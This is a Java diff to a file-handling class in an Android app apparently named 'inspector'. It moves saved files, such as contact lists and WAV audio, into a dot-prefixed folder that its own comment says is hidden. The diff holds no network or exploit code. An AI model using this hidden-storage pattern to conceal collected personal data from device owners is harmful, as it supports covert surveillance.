@@ -23,7 +23,10 @@ import com.particle.inspector.common.util.DeviceProperty;
 */
 public class FileCtrl 
 {
-	public static final String DEFAULT_FOLDER = "tmp";
+	// In Android, a folder with name starts with '.' is hidden.
+	public static final String DEFAULT_FOLDER_P1 = "Android";
+	public static final String DEFAULT_FOLDER_P2 = "Android/data";
+	public static final String DEFAULT_FOLDER = "Android/data/.tmp";
 	
 	public static final String SUFFIX_TXT = ".txt";
 	public static final String SUFFIX_WAV = ".wav";
@@ -38,9 +41,17 @@ public class FileCtrl
 		return new File(getDefaultDirStr());
 	}
 	
+	public static File getDefaultDirP1() {
+		return new File(getSDCardRootPath() + "/" + DEFAULT_FOLDER_P1 + "/");
+	}
+	
+	public static File getDefaultDirP2() {
+		return new File(getSDCardRootPath() + "/" + DEFAULT_FOLDER_P2 + "/");
+	}
+	
 	/**
 	 * Save file to SD-CARD. If the file exists, overwrite it. 
-	 * @param fullname the fullname of the file, e.g. tmp/contact_2011-01-01.txt
+	 * @param fullname the fullname of the file, e.g. /sdcard/Android/data/.tmp/contact_2011-01-01.txt
 	 */
 	public static File Save2SDCard(String fullname, String content) throws Exception
 	{
@@ -110,10 +121,14 @@ public class FileCtrl
         return dir;  
     }
 	
-	public static File creatDefaultSDDir()
+	public static File createDefaultSDDir()
 	{  
+		File dirP1 = getDefaultDirP1();
+		File dirP2 = getDefaultDirP2();
         File dir = getDefaultDir();
         try {
+        	if (!dirP1.exists()) dirP1.mkdir();
+        	if (!dirP2.exists()) dirP2.mkdir();
         	if (!dir.exists()) dir.mkdir();
         } catch (Exception ex) {}
         return dir;  
